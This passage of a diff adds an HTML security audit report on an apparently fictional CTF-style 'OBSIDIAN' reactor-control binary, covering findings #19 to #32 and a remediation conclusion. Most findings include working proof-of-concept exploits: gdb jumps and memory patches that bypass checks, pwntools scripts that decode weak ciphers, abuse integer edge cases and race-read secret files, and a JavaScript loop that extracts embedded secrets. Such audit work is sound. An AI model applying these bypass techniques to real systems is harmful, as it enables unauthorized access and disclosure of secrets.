+Location: <a href="source_code/src/commands/trigger_emergency_shutdown.c#L14">source_code/src/commands/trigger_emergency_shutdown.c</a><br>
+Function: <code>trigger_emergency_shutdown()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+By using instruction pointer jumps and register manipulation, the PoC forces a success state without legitimate flow completion.<br>
+This reveals fragile runtime trust assumptions under tampering or just be admin.<br></p>
+<p>Proof of Concept:</p>
+<pre><code class="language-gdb">break *0x004024a0
+break *0x004034ba
+run
+init_reactor
+jump *0x004034a8
+break *0x4034b7
+jump *0x4034b7
+set $eax=1
+break *0x4189d0
+continue
+continue
+</code></pre>
+<p>Impact:<br>
+Forced privileged shutdown flow<br>
+Bypass of expected safety checks in debug-capable context</p>
+<h3 id="vulnerability-20-null-pointer-dereference-history_add">Vulnerability #20: NULL Pointer Dereference (history_add)</h3>
+<p>Severity: High<br>
+Type: NULL Pointer Dereference / Memory Corruption<br>
+Location: <a href="source_code/src/commands/history.c#L54">source_code/src/commands/history.c</a><br>
+Function: <code>history_add()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+When shifting history entries, the code accesses <code>history[i+1]</code> without null checking.
+If the history array contains NULL entries, this dereferences NULL and causes a crash.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">for (int i = 0; i &lt; history_count - 1; i++)
+    history[i] = history[i + 1];  // No null check - may dereference NULL
+</code></pre>
+<p>Impact:<br>
+Denial of service via null pointer dereference<br>
+Process crash<br></p>
+<h3 id="vulnerability-21-log-injection-history_add">Vulnerability #21: Log Injection (history_add)</h3>
+<p>Severity: High<br>
+Type: Log Injection / Unsanitized Input<br>
+Location: <a href="source_code/src/commands/history.c#L54">source_code/src/commands/history.c</a><br>
+Function: <code>history_add()</code><br>
+Discovered in: White-box<br></p>
+<p>Description:
+User input from history command is written directly to a log file without sanitization.
+This allows attackers to inject arbitrary content into logs, forging audit trails.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">fprintf(file, &quot;%s\n&quot;, history[i]);  // Unsanitized user input written to log
+</code></pre>
+<p>Impact:<br>
+Log injection and tampering<br>
+Audit trail manipulation<br></p>
+<h3 id="vulnerability-22-check_reactor_status">Vulnerability #22: check_reactor_status</h3>
+<p>Severity: Medium<br>
+Type: Weak encrypting<br>
+Location: <a href="source_code/src/commands/check_reactor_status.c#L43">source_code/src/commands/check_reactor_status.c</a><br>
+Function: <code>check_reactor_status()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+Critical reactor data is protected with a Caesar shift (gap=3), which is trivially reversible.<br>
+This is obfuscation, not encryption, and does not provide confidentiality.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+def cipher(encoded, gap):
+    alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+    decoded = list(encoded)
+
+    for i, char in enumerate(decoded):
+        if char in alphabet:
+            new_gap = (alphabet.index(char) - gap) % len(alphabet)
+            decoded[i] = alphabet[new_gap]
+
+    return &quot;&quot;.join(decoded)
+
+def main():
+    warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+    context.log_level = 'error'
+
+    env = os.environ.copy()
+    env['LD_LIBRARY_PATH'] = './runner/external/'
+
+    pid = process(['./runner/run.sh'], env=env)
+    pid.recv(numb=100, timeout=1.0)
+    pid.sendline(b'check_reactor_status')
+
+    line = pid.recvline_startswith(b'Encrypted message:')
+
+    print(text.red(&quot;[+]&quot;) + &quot; Vuln Weak Encryption - check_reactor_status:&quot;)
+    print(cipher(line.decode().split()[2], 3))
+    print()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Impact:<br>
+Loss of confidentiality of supposedly protected status data<br>
+Attackers can decode messages without key material</p>
+<h3 id="vulnerability-23-send_status_report">Vulnerability #23: send_status_report</h3>
+<p>Severity: Medium<br>
+Type: Weak encrypting<br>
+Location: <a href="source_code/src/commands/send_status_report.c#L68">source_code/src/commands/send_status_report.c</a><br>
+Function: <code>send_status_report()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+Status report data is only Base64-encoded and presented as if protected.<br>
+Base64 is not a security mechanism and can be decoded instantly.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-bash">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+def main():
+    warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+    context.log_level = 'error'
+
+    env = os.environ.copy()
+    env['LD_LIBRARY_PATH'] = './runner/external/'
+
+    os.system(&quot;mkdir Data&quot;)
+
+    pid = process(['./runner/run.sh'], env=env)
+    pid.recv(numb=100, timeout=1.0)
+    pid.sendline(b'send_status_report')
+
+    pid.recv(timeout=2.0)
+
+    print(text.red(&quot;[+]&quot;) + &quot; Vuln Weak Encryption - send_status_report:&quot;)
+    os.system(&quot;./send_status_report/decrypt.sh&quot;)
+    print()
+
+    os.system(&quot;rm -rf Data&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Impact:<br>
+Sensitive status report disclosure<br>
+False sense of security for transmitted or stored data</p>
+<h3 id="vulnerability-24-init_steam_turbine">Vulnerability #24: init_steam_turbine</h3>
+<p>Severity: Medium<br>
+Type: Insecure Randomness<br>
+Location: <a href="source_code/obsidian_lib.so#L1">source_code/obsidian_lib.so</a><br>
+Function: <code>init_steam_turbine()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+Random values are generated with rand() seeded by time(NULL).<br>
+This pattern is predictable and reproducible when seed timing is known or approximated because it depend actual time.</p>
+<p><img alt="alt text" src="assets/random_hour.png" /></p>
+<p>Proof of Concept:</p>
+<pre><code class="language-c">srand((__u_int)time((time_t *)0x0));
+printf(&quot;magix - decompil: %i\n&quot;, rand());
+</code></pre>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+context.log_level = 'error'
+
+env = os.environ.copy()
+env['LD_LIBRARY_PATH'] = './runner/external/'
+
+os.system(&quot;clang ./external_lib/init_steam_turbine/decompiler/main.c -o ./external_lib/init_steam_turbine/decompiler/main&quot;)
+os.system(&quot;clang ./external_lib/init_steam_turbine/decompiler/rand.c -o ./external_lib/init_steam_turbine/decompiler/rand&quot;)
+pid = process(['./external_lib/init_steam_turbine/decompiler/main'], env=env)
+line = pid.recvline_startswith(b'magix - decompil:')
+
+print(text.red(&quot;[+]&quot;) + &quot; Vuln Insecure Randomness - init_steam_turbine:&quot;)
+print(line.decode(errors='ignore'))
+os.system(&quot;./external_lib/init_steam_turbine/decompiler/rand&quot;)
+print()
+</code></pre>
+<p>Impact:<br>
+Predictable random-dependent behavior<br>
+Potential bypass of logic that assumes randomness</p>
+<h3 id="vulnerability-25-simulate_meltdown">Vulnerability #25: simulate_meltdown</h3>
+<p>Severity: Medium<br>
+Type: Insecure Randomness<br>
+Location: <a href="source_code/src/commands/simulate_meltdown.c#L16">source_code/src/commands/simulate_meltdown.c</a><br>
+Function: <code>simulate_meltdown()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+Critical branch triggering can be reached by repeatedly invoking the function until a random-dependent condition occurs.<br>
+This demonstrates non-robust control relying on weak randomness.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+def main():
+    warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+    context.log_level = 'error'
+
+    env = os.environ.copy()
+    env['LD_LIBRARY_PATH'] = './runner/external/'
+
+    pid = process(['./runner/run.sh'], env=env)
+
+    while True:
+        pid.recv(numb=100, timeout=1.0)
+        pid.sendline(b'simulate_meltdown')
+
+        line = pid.recvline_startswith(&quot;Critical&lt;br&gt; Error:&quot;, timeout=1.0)
+
+        if (line != b''):
+            print(text.red(&quot;[+]&quot;) + &quot; Vuln Insecure Randomness - simulate_meltdown:&quot;)
+            print(line.decode().split(&quot; &quot;)[5])
+            print()
+            return
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>Impact:<br>
+Unauthorized triggering of critical error states<br>
+Increased operational risk from probabilistic abuse</p>
+<h3 id="vulnerability-26-run_turbine">Vulnerability #26: run_turbine</h3>
+<p>Severity: Medium<br>
+Type: Integer Overflow / Underflow<br>
+Location: <a href="source_code/obsidian_lib.so#L1">source_code/obsidian_lib.so</a><br>
+Function: <code>run_turbine()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+User input is parsed with atoi then stored in an unsigned integer.<br>
+Supplying negative values (e.g., -1) leads to inconsistent comparisons and unsafe control flow behavior.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+context.log_level = 'error'
+
+env = os.environ.copy()
+env['LD_LIBRARY_PATH'] = './runner/external/'
+
+pid = process(['./runner/run.sh'], env=env)
+pid.recv(numb=100, timeout=1.0)
+
+pid.sendline(b'run_turbine')
+pid.recv(timeout=1.0)
+
+pid.sendline(b'-1')
+pid.recvline_endswith(b'17/-1')
+line = pid.recvline()
+
+
+print(text.red(&quot;[+]&quot;) + &quot; FLAG run_turbine:&quot;)
+print(line.decode(errors='ignore').split(&quot;\n&quot;)[0])
+print()
+</code></pre>
+<p>Impact:<br>
+Logic bypass of input constraints<br>
+Unexpected runtime behavior and potential stability issues</p>
+<h3 id="vulnerability-27-turbine_explode">Vulnerability #27: turbine_explode</h3>
+<p>Severity: Medium<br>
+Type: Integer Overflow / Underflow<br>
+Location: <a href="source_code/obsidian_lib.so#L1">source_code/obsidian_lib.so</a><br>
+Function: <code>turbine_explode()</code><br>
+Discovered in: Black-box</p>
+<p>Description:<br>
+Input is converted with strtoll and cast to int, then compared to specific sentinel values.<br>
+Supplying edge integers triggers the dangerous branch directly.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+context.log_level = 'error'
+
+env = os.environ.copy()
+env['LD_LIBRARY_PATH'] = './runner/external/'
+
+pid = process(['./runner/run.sh'], env=env)
+pid.recv(numb=100, timeout=1.0)
+
+pid.sendline(b'turbine_temperature')
+pid.recv(timeout=1.0)
+pid.sendline(b'2147483646')
+
+
+print(text.red(&quot;[+]&quot;) + &quot; FLAG turbine_explode:&quot;)
+print(pid.clean().decode(errors='ignore').split(&quot;\n&quot;)[1])
+print()
+</code></pre>
+<p>Impact:<br>
+Forced Critical failure path<br>
+Potential denial of service and unsafe state transitions</p>
+<h3 id="vulnerability-28-set_reactor_power">Vulnerability #28: set_reactor_power</h3>
+<p>Severity: Medium<br>
+Type: Bypass<br>
+Location: <a href="source_code/src/commands/set_reactor_power.c#L1">source_code/src/commands/set_reactor_power.c</a><br>
+Function: <code>set_reactor_power()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The PoC demonstrates bypass by modifying local state in memory at runtime.<br>
+This indicates insufficient hardening against tampering and weak trust in mutable local validation state.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-gdb">break *0x402d02
+run
+set_reactor_power
+0
+set {int}($rbp-0x4)=0x7ffffc19
+continue
+
+#Succefull done exploit
+</code></pre>
+<p>Impact:<br>
+Bypass of expected validation constraints<br>
+Unauthorized state transitions when debugger access exists</p>
+<h3 id="vulnerability-29-turbine_remote_access">Vulnerability #29: turbine_remote_access</h3>
+<p>Severity: Medium<br>
+Type: Race Condition<br>
+Location: <a href="source_code/obsidian_lib.so#L1">source_code/obsidian_lib.so</a><br>
+Function: <code>turbine_remote_access()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The module stores sensitive access data in a temporary file under Data/ and leaves a readable window before cleanup.<br>
+An attacker monitoring the directory can read secrets before unlink.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import os
+import warnings
+
+warnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)
+context.log_level = 'error'
+
+os.system(&quot;mkdir -p Data&quot;)
+env = os.environ.copy()
+env['LD_LIBRARY_PATH'] = './runner/external/'
+
+pid = process(['./runner/run.sh'], env=env)
+pid.recv(numb=100, timeout=1.0)
+pid.sendline(b'turbine_remote_access')
+
+pid.recv(timeout=1.0)
+
+print(text.red(&quot;[+]&quot;) + &quot; FLAG turbine_remote_access:&quot;)
+os.system(&quot;find ./Data/ -type f -exec cat {} \\;&quot;)
+print(&quot;\n&quot;)
+os.system(&quot;rm -rf Data&quot;)
+</code></pre>
+<p>Impact:<br>
+Disclosure of sensitive access tokens/flags<br>
+Race-window based data leakage</p>
+<h3 id="vulnerability-30-quit">Vulnerability #30: quit</h3>
+<p>Severity: Medium<br>
+Type: Bypass<br>
+Location: <a href="source_code/src/commands/unlock_secret_mode.c#L13">source_code/src/commands/unlock_secret_mode.c</a><br>
+Function: <code>unlock_secret_mode()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+Execution can be redirected to post-validation logic through direct jump, bypassing normal checks and flow constraints.<br></p>
+<p>Proof of Concept:</p>
+<pre><code class="language-gdb">break *0x00402f55
+run
+quit
+jump *0x00402f69
+</code></pre>
+<p>Impact:<br>
+Bypass of intended quit/control checks<br>
+Potential abuse of hidden branches in debug context<br></p>
+<h3 id="vulnerability-31-log_system_events">Vulnerability #31: log_system_events</h3>
+<p>Severity: Medium<br>
+Type: Bypass<br>
+Location: <a href="source_code/src/commands/log_system_events.c#L36">source_code/src/commands/log_system_events.c</a><br>
+Function: <code>log_system_events()</code><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+The PoC modifies in-memory bytes at strategic addresses to alter behavior and access internal logs.<br>
+This demonstrates weak resilience against runtime tampering and state integrity attacks.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-gdb">break *0x0040279e
+run
+
+leak
+set {char}($rdi+4)=0
+set {char}($rax+4)=0
+continue
+
+# Succesfull done exploit: Open Data/system.log
+</code></pre>
+<p>Impact:<br>
+Unauthorized access to protected log resources<br>
+Integrity loss of runtime decision state<br></p>
+<h3 id="vulnerability-32-call_api">Vulnerability #32: call_api</h3>
+<p>Severity: Medium<br>
+Type: Information Disclosure<br>
+Location: <a href="https://obsidian-website-seven.vercel.app/">https://obsidian-website-seven.vercel.app/</a><br>
+Discovered in: Black-box<br></p>
+<p>Description:<br>
+Sensitive information is recoverable by iterating an obfuscated JavaScript API call.<br>
+The protection relies on obscurity rather than access control or cryptography.</p>
+<p>Proof of Concept:</p>
+<pre><code class="language-javascript">for (let i = 0; i &lt; 20; i++) {
+    try { console.log(i, qNNX.GNNS(i)); }
+    catch(e) {}
+}
+</code></pre>
+<p>Impact:<br>
+Exposure of embedded secret values<br>
+Loss of confidentiality for client-distributed logic/data<br></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>This audit campaign highlights a high overall risk level for the security of the OBSIDIAN platform.<br>
+The identified vulnerabilities span multiple critical classes (Hardcoded credentials, bypass, memory corruption, buffer overflow, weak encrypting, insecure randomness), confirming structural weaknesses rather than isolated cases.</p>
+<p>The main business and operational impacts are:<br>
+- Privilege escalation and bypass of security controls.<br>
+- Exposure of sensitive information and potential leakage of reusable secrets.<br>
+- Possible system destabilization (crashes, critical states, unexpected behavior).<br>
+- Increased risk of full compromise through vulnerability chaining.<br></p>
+<p>Recommended remediation priorities:<br>
+1. Immediately remove all hardcoded secrets and implement centralized secret management.<br>
+2. Fix memory safety and dangerous conversion issues (overflow/underflow, stack corruption, boundary checks).<br>
+3. Strengthen access controls and validation logic to eliminate bypass paths.<br>
+4. Replace weak mechanisms (base64-as-protection, trivial ciphers, rand/time) with robust cryptographic and randomness primitives.<br>
+5. Add defense in depth: binary hardening, compiler protections, security code review, and security regression testing in CI.</p>
+<p>In conclusion, the current binary state does not provide an acceptable production security level without prioritized remediation of the Critical<br> issues identified in this report.</p>
+<p><img alt="alt text" src="assets/logo.png" /></p>
+<h3 id="the-stone-corporation">The Stone Corporation</h3>
+<h4 id="lukas-soigneux">Lukas Soigneux</h4>
+              
+            </div>
+          </div><footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+    
+  </span>
+</div>
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = ".";</script>
+    <script src="js/theme_extra.js"></script>
+    <script src="js/theme.js"></script>
+      <script src="search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
+
+<!--
+MkDocs version : 1.6.1
+Build Date UTC : 2026-05-23 16:26:42.762309+00:00
+-->
